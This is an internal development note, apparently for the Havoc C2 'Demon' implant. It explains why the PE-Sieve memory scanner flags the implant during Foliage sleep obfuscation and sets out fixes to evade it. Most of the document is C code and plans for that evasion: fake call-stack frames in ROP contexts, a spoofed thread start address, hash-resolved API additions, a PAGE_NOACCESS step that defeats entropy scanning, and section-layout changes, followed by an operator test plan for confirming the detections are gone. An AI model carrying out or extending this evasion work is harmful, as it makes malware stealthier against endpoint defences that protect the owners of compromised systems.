# HVC-030 Post-Test — PE-Sieve Detection Analysis

**Status:** In Progress — Fixes A + B applied 2026-05-22; Fix C (PAGE_NOACCESS) and Fix D (section audit) pending
**Applied scope:**
- `payloads/Demon/src/core/ObfFoliage.c` — Fix A (fake callstack for RopWaitObj + RopSpoof)
- `payloads/Demon/src/Demon.c` — Fix B (ThreadStartAddr = RtlUserThreadStart)
- `payloads/Demon/include/common/Defines.h` — Fix B (H_FUNC_RTLUSERTHREADSTART, H_FUNC_BASETHREADINITTHUNK)
- `payloads/Demon/include/Demon.h` — Fix B (WIN_FUNC entries for RtlUserThreadStart, BaseThreadInitThunk)
**Pending scope:**
- `payloads/Demon/src/core/ObfFoliage.c` — Fix C (PAGE_NOACCESS ROP step — separate task)
- `payloads/Demon/CMakeLists.txt` — Fix D (section flags audit — separate task)

---

## Test Command

pe-sieve64.exe /pid 5724 /iat 2 /threads

Process: demon-x64-foliage-rtlqueueworkitem-havoc.exe
Sleep mode: Foliage (Technique=3), Sleep=10ms, Jitter=15%
Scan performed: DURING an active ~9-second sleep window

---

## Simple Explanation

Pe-sieve found 3 categories of suspicious behavior:

1. **Malformed PE headers** (×2) — The MZ/NT headers are zeroed during sleep (Sub-2 is working correctly). This detection is expected and acceptable. It is a weaker signal than a full PE signature match.

2. **Suspicious thread with corrupted callstack** — The Foliage APC technique manipulates a thread's context via NtContinue. The thread sleeping in WaitForSingleObjectEx has only 1 visible stack frame instead of the expected 5-10. The thread start address (NtTestAlert) is also suspicious for a long-lived sleeping thread.

3. **High-entropy "shellcode" region** — The last 0xf000 bytes of the Demon image (offset 0x1e000 from ImageBase) retain PAGE_EXECUTE_WRITECOPY (0x80) protection after the Foliage ROP chain runs. The RC4-encrypted content of that region has near-maximum entropy (7.997 bits/byte). Pe-sieve classifies executable memory with near-random entropy as implanted shellcode.

Detections 2 and 3 are actionable. Detection 1 is by design.

---

## Runtime Context at Scan Time

The scan was run **during an active Foliage sleep cycle** (Sleep=10ms, jitter=15%, actual timeout ~9 seconds). The debug log confirms:

```
FoliageObf: all 10 APCs queued, resuming thread
NtAlertResumeThread → 00000000 (success)
FoliageObf: signaling event and waiting for thread to exit
SysNtSignalAndWaitForSingleObject → 00000000   ← agent ASLEEP (9-second window)
SysNtWriteVirtualMemory → 00000000              ← PeProtect_Restore fires (Sub-2 working)
FoliageObf: thread exited, sleep cycle complete
```

The `SysNtWriteVirtualMemory` confirms Sub-2 (`PeProtect_Restore` → `MmVirtualWrite`) is correctly called after the sleep. The scan occurred inside the 9-second window between those two log lines.

Demon image at scan time:
- `ImageBase = 0x00007FF6A3A50000`
- `ImageSize = 184320` (0x2D000)
- `TxtBase = ImageBase`, `TxtSize = ImageSize` (EXE mode — no KArgs, fallback to full image)

---

## Detection 1 & 2 — `malformed_header`

**Pe-sieve output:**
```json
{ "malformed_header": { "status": 1, "module": "7ff6a3a50000",
  "module_file": "demon-x64-foliage-rtlqueueworkitem-havoc.exe" } }
```
(reported twice — one per scan pass)

**Root cause:** Sub-2 (`PeProtect_Stomp`) zeroes the first 0x1000 bytes of the image
immediately before sleep. The MZ magic, NT headers, and section table are all absent.
Pe-sieve flags the absence of valid PE headers as `malformed_header`.

**Assessment:** Expected and by design. The PE signature cannot be matched when headers
are absent. The malformed-header flag is a significantly weaker signal than a direct
signature hit. **This detection is an acceptable Sub-2 trade-off.**

**Future hardening (out of current scope):** Replace the zeroed header region with a copy
of a known system DLL header (e.g., ntdll.dll) so the mapped region appears to be a
legitimate Windows module rather than a PE with missing headers.

---

## Detection 3 — `thread_scan` (SUS_START, SUS_CALLS_INTEGRITY, SUS_CALLSTACK_CORRUPT)

**Pe-sieve output:**
```json
{
  "thread_id": 12864,
  "state": "Waiting", "wait_reason": "UserRequest",
  "callstack": {
    "stack_ptr": "f632a00000",
    "frames_count": 1,
    "frames": ["7ffc04e170b0;kernel32.dll!WaitForSingleObjectEx"]
  },
  "last_sysc": "NtSignalAndWaitForSingleObject",
  "last_func": "WaitForSingleObjectEx",
  "indicators": ["SUS_START", "SUS_CALLS_INTEGRITY", "SUS_CALLSTACK_CORRUPT"],
  "susp_addr": "7ff6a3a6e7d0",
  "module": "7ff6a3a6e000",
  "protection": "80"
}
```

### SUS_CALLSTACK_CORRUPT + SUS_CALLS_INTEGRITY

The Foliage APC chain includes a **context-spoof step** on the main fiber:

- `RopGetCtx` captures the main fiber's current context into `RopCap`
- `RopSetCtx` calls `NtSetContextThread(hDupObj, RopSpoof)`, replacing the fiber's context

`RopSpoof` is configured in `ObfFoliage.c` (inside the `SysNtAlertResumeThread` success block):
```c
RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
RopSpoof->Rsp = U_PTR( Instance->Teb->NtTib.StackBase );
// TODO: try to spoof the stack and remove the pointers
```

Setting `Rsp = StackBase` places the stack pointer at the **very top** of the fiber's
stack region. There are no return addresses at `[StackBase]` — the location is either
unmapped or zeroed. Pe-sieve's stack walker reads `[RSP]` to find the next frame and
finds nothing. Result: **1 visible frame** (WaitForSingleObjectEx).

A legitimate sleeping thread would show 5–10 frames:
`... → FiberDispatch → BaseThreadInitThunk → RtlUserThreadStart`.

**Code location:** `payloads/Demon/src/core/ObfFoliage.c` — `RopSpoof` setup block (~line 246–249)

### SUS_START

`Instance->Config.Implant.ThreadStartAddr = Instance->Win32.NtTestAlert`
Set in `payloads/Demon/src/Demon.c:931`.

`NtTestAlert` is an ntdll syscall stub. Pe-sieve queries the Win32 start address
(`NtQueryInformationThread(ThreadQuerySetWin32StartAddress)`) and flags it because legitimate
long-lived sleeping threads do not start at syscall stubs. Typical valid start addresses:
`RtlUserThreadStart`, `BaseThreadInitThunk`, thread-pool dispatch functions.

The `susp_addr 7ff6a3a6e7d0` is offset 0x1e7d0 within the Demon image — this is the
address pe-sieve associates with the suspicious module that the thread's context intersects.

---

## Detection 4 — `implanted_shc` (entropy 7.997)

**Pe-sieve output:**
```json
{
  "module": "7ff6a3a6e000", "module_size": "f000",
  "protection": "80",
  "stats": { "area_start": "0", "area_size": "f000", "entropy": 7.99678 }
}
```

### Factor A: Image section split at offset 0x1e000

The Demon image (0x2D000 bytes) is internally split into two VirtualQuery regions:
- Region 1: `7ff6a3a50000` — 0x1e000 bytes (main image, in dump report as `.exe`)
- Region 2: `7ff6a3a6e000` — 0x0f000 bytes (detected as `.shc`)
- Combined: 0x2d000 = exact ImageSize ✓

The split occurs because the **last section of the Demon EXE** carries different page
characteristics from the rest. The MinGW linker produces a section at the end of the image
(likely `.data`/BSS) with `IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE` characteristics.
The Windows PE loader maps such sections as `PAGE_EXECUTE_WRITECOPY` (0x80) — distinct from
the code section's `PAGE_EXECUTE_READ` (0x20).

Because these two sub-ranges have different protections, they appear as separate entries
in the Windows VAD tree. When the Foliage ROP chain calls:
```c
NtProtectVirtualMemory( NtCurrentProcess(), &ImageBase, &ImageSize, PAGE_READWRITE, &TmpValue )
```
it may only change the FIRST contiguous VAD region (0x1e000 bytes), leaving the last
0x0f000 bytes at their original `PAGE_EXECUTE_WRITECOPY` protection.

### Factor B: Near-maximum entropy from RC4 encryption

`SystemFunction032` (RC4) in `RopMemEnc` covers the full ImageSize (0x2d000 bytes) because
`Rc4.Length = Rc4.MaximumLength = ImageSize`. The last section IS encrypted. RC4 output
is statistically indistinguishable from uniformly random data: entropy ≈ 8.0 bits/byte.
Pe-sieve measures 7.997 for this region.

Combined: executable permissions + near-maximum entropy + no PE structure = `implanted_shc`.

**Debug log correlation:**
```
FoliageObf: ImageBase=00007FF6A3A50000 ImageSize=184320 TxtBase=00007FF6A3A50000 TxtSize=184320
```
`TxtBase = ImageBase` because in EXE mode (`KArgs = NULL`) `Session.TxtBase` is never set,
so Foliage falls back to `TxtBase = ModuleBase; TxtSize = ModuleSize`. The section split
is invisible to the current code.

---

## Summary Table

| Detection | Pe-sieve indicator | Root cause | Severity |
|-----------|-------------------|------------|----------|
| PE headers zeroed | `malformed_header` ×2 | Sub-2 working correctly | Low — expected trade-off |
| 1-frame callstack | `SUS_CALLSTACK_CORRUPT` | `RopSpoof->Rsp = StackBase`, no fake frames | High |
| Suspicious calls | `SUS_CALLS_INTEGRITY` | Same as above | High |
| Thread start address | `SUS_START` | `ThreadStartAddr = NtTestAlert` (syscall stub) | Medium |
| High-entropy region | `implanted_shc` (entropy 7.997) | Last section retains `PAGE_EXECUTE_WRITECOPY` + RC4 encrypted | High |

---

## Proposed Solutions

### Fix A — Fake callstack frames in RopWaitObj + RopSpoof (addresses SUS_CALLSTACK_CORRUPT, SUS_CALLS_INTEGRITY)

**File:** `payloads/Demon/src/core/ObfFoliage.c`

Two sub-changes in the same file. The worker thread and the main fiber each need a plausible
callstack during the sleep window.

**Part 1 — RopWaitObj (worker thread APC chain step):**

The worker thread sleeps in `WaitForSingleObjectEx` via the `RopWaitObj` NtContinue step.
`[RSP+0]` **must remain `NtTestAlert`** — this is the return address the CPU jumps to when
`WaitForSingleObjectEx` returns, and it causes the kernel to deliver the next queued APC.
Replacing `[RSP+0]` with any other address would break the APC chain and deadlock the agent.
Fake pe-sieve evasion frames are placed above it:

```c
/* [RSP+0] = NtTestAlert: required for APC delivery after WaitForSingleObjectEx returns */
/* fake frames at [RSP+8] and [RSP+16] give pe-sieve a plausible callstack depth */
*( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x0 ) ) = C_PTR( Instance->Win32.NtTestAlert );
*( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x1 ) ) = C_PTR( Instance->Win32.BaseThreadInitThunk );
*( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x2 ) ) = C_PTR( Instance->Win32.RtlUserThreadStart );
*( PVOID* )( RopWaitObj->Rsp + ( sizeof( ULONG_PTR ) * 0x3 ) ) = C_PTR( 0 );
```

Pe-sieve will walk: `WaitForSingleObjectEx ← NtTestAlert ← BaseThreadInitThunk ← RtlUserThreadStart`
(4 frames), which passes the depth check for `SUS_CALLSTACK_CORRUPT`.

**Part 2 — RopSpoof (main fiber context spoof):**

Replace the RopSpoof setup block (~line 246–249) to write fake frames at `StackBase-0x50`
and point the spoofed RSP there:

```c
PVOID FakeFrames = C_PTR( U_PTR( Instance->Teb->NtTib.StackBase ) - 0x50 );
*( PVOID* )( U_PTR(FakeFrames) + 0x00 ) = C_PTR( Instance->Win32.BaseThreadInitThunk );
*( PVOID* )( U_PTR(FakeFrames) + 0x08 ) = C_PTR( Instance->Win32.RtlUserThreadStart );
*( PVOID* )( U_PTR(FakeFrames) + 0x10 ) = NULL;

RopSpoof->ContextFlags = CONTEXT_FULL;
RopSpoof->Rip = U_PTR( Instance->Win32.WaitForSingleObjectEx );
RopSpoof->Rsp = U_PTR( FakeFrames );
```

`RopSetCtx2` still restores the original context from `RopCap` after sleep, so the fiber
resumes correctly. The fake frames are only visible to scanners during the sleep window.
`StackBase-0x50` is committed stack memory far from the guard page — safe to write.

**Requires:** `BaseThreadInitThunk` (kernel32) and `RtlUserThreadStart` (ntdll) must be
added to the Win32 function table. See Fix B.

### Fix B — Better thread start address (addresses SUS_START)

**Files:**
1. `payloads/Demon/include/common/Defines.h` — add hash constants:
   ```c
   #define H_FUNC_RTLUSERTHREADSTART    0xdaa22b3c
   #define H_FUNC_BASETHREADINITTHUNK   0x98649676
   ```
2. `payloads/Demon/include/Demon.h` — add WIN_FUNC entries in the ntdll/kernel32 blocks:
   ```c
   WIN_FUNC( RtlUserThreadStart )    /* ntdll */
   WIN_FUNC( BaseThreadInitThunk )   /* kernel32 */
   ```
3. `payloads/Demon/src/Demon.c` — add resolution calls alongside existing ntdll/kernel32 resolutions:
   ```c
   Instance->Win32.RtlUserThreadStart  = LdrFunctionAddr( Instance->Modules.Ntdll,    H_FUNC_RTLUSERTHREADSTART );
   Instance->Win32.BaseThreadInitThunk = LdrFunctionAddr( Instance->Modules.Kernel32, H_FUNC_BASETHREADINITTHUNK );
   ```
4. `payloads/Demon/src/Demon.c:931` — change ThreadStartAddr:
   ```c
   Instance->Config.Implant.ThreadStartAddr = Instance->Win32.RtlUserThreadStart;
   ```

Hashes computed with the Demon DJB2 hash (`HASH_KEY=5381`, formula `h = h*33 + c`).

### Fix C — PAGE_NOACCESS step in Foliage ROP chain (addresses implanted_shc)

**File:** `payloads/Demon/src/core/ObfFoliage.c`

Add two new ROP entries to the APC chain:
- `RopSetMemNA` (after `RopMemEnc`, before `RopGetCtx`): `NtProtectVirtualMemory(ImageBase, ImageSize, PAGE_NOACCESS)`
- `RopSetMemRw2` (after `RopWaitObj`, before `RopMemDec`): `NtProtectVirtualMemory(ImageBase, ImageSize, PAGE_READWRITE)`

When the encrypted region has `PAGE_NOACCESS` during the sleep window, pe-sieve's
entropy measurement fails with an access violation. The region is skipped — no
shellcode detection.

**New APC chain (12 entries):**
```
RopBegin    → NtWaitForSingleObject(hEvent)
RopSetMemRw → NtProtectVirtualMemory(RW)
RopMemEnc   → SystemFunction032(encrypt)
RopSetMemNA → NtProtectVirtualMemory(NOACCESS)   ← NEW
RopGetCtx   → NtGetContextThread
RopSetCtx   → NtSetContextThread (spoof)
RopWaitObj  → WaitForSingleObjectEx(timeout)
RopSetMemRw2→ NtProtectVirtualMemory(RW)         ← NEW
RopMemDec   → SystemFunction032(decrypt)
RopSetMemRx → NtProtectVirtualMemory(dwProtect)
RopSetCtx2  → NtSetContextThread (restore)
RopExitThd  → RtlExitUserThread
```

Implementation requires: add `RopSetMemNA` and `RopSetMemRw2` PCONTEXT variables,
LocalAlloc calls, ContextFlags assignments, and NtQueueApcThread calls (current code
has 10 APCs; this extends to 12). The signature of RopSetMemNA is identical to
RopSetMemRw — copy that entry and change R9 to `PAGE_NOACCESS`.

**Status:** Pending — flagged as a separate implementation task.

### Fix D — Section permission audit (partial mitigation for implanted_shc)

**File:** `payloads/Demon/CMakeLists.txt`

Audit the final linked binary for sections with `IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE`
characteristics. MinGW may produce such sections from writable-string or initialised-data
sections. If present, add linker flags to prevent the section split:
```
-Wl,--subsystem,console    (already used for PE type)
-Wl,-Map=demon.map         (audit section layout)
```
If a specific section is found with EW characteristics, consider using `__attribute__((section(".text")))`
to relocate relevant data, or `-fno-common` to prevent writable-common-section creation.

This fix reduces the VAD split that causes the last 0x0f000 bytes to be a separate region.
Combined with Fix C (PAGE_NOACCESS), it eliminates the `implanted_shc` detection entirely.

---

## Operator Test Plan

After applying all fixes, re-run the same pe-sieve command:
```
pe-sieve64.exe /pid <PID> /iat 2 /threads
```

### Expected results by fix stage

**After Fix A + Fix B only:**
- `malformed_header` ×2 — still present (Sub-2 trade-off, expected)
- `implanted_shc` — still present (Fix C not yet applied)
- Thread scan: `SUS_START`, `SUS_CALLS_INTEGRITY`, `SUS_CALLSTACK_CORRUPT` — **gone**
- Thread scan: `frames_count` should increase from 1 to ≥3

**After Fix C additionally:**
- `malformed_header` ×2 — still present (only detection remaining)
- `implanted_shc` — **gone** (PAGE_NOACCESS prevents entropy measurement)
- Thread scan indicators — still gone from Fix A/B

**Final state (only `malformed_header` remaining):**
This is the expected steady-state. `malformed_header` means Sub-2 is actively working.
A scanner that attempts to match the Demon signature against the first 0x1000 bytes
during sleep will find no bytes to match.

---

## What is NOT Changed

- Sub-2 PE header stomp (`PeProtect_Stomp`/`PeProtect_Restore`) is working correctly.
  The `malformed_header` detection confirms it.
- Sub-1 JMPRAX gadget fix is not touched.
- The RC4 memory encryption (`SystemFunction032`) is working correctly for both the
  Foliage APC chain and the main image range.
- The Foliage thread lifecycle (create, queue APCs, signal, wait, cleanup) is correct.
  All 10 APCs queued and the thread exits cleanly every sleep cycle.

---

## Spec Deviation

The analysis document `improvement-docs/04-sleep-obfuscation.md` does not document the
VAD split issue (Factor A of Detection 4) or the RopSpoof StackBase issue. These were
discovered empirically via pe-sieve. The spec should be updated to include PAGE_NOACCESS
as a required step in the Foliage chain and to describe the fake callstack requirement.

Do NOT place this information in memory files — it belongs here in `improvement-docs/`.
